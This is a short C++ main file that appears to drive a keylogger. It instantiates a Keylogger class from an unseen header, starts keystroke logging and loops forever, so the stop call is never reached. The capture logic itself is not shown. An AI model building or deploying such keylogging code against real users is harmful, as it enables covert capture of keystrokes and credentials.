#include "keylogger.h"

int main(int argc, char** argv) {
	Keylogger keyboard;

	keyboard.startKeylog();

	while (true) {
		std::this_thread::sleep_for(keyboard.polling);
	}

	keyboard.stopKeylog();
}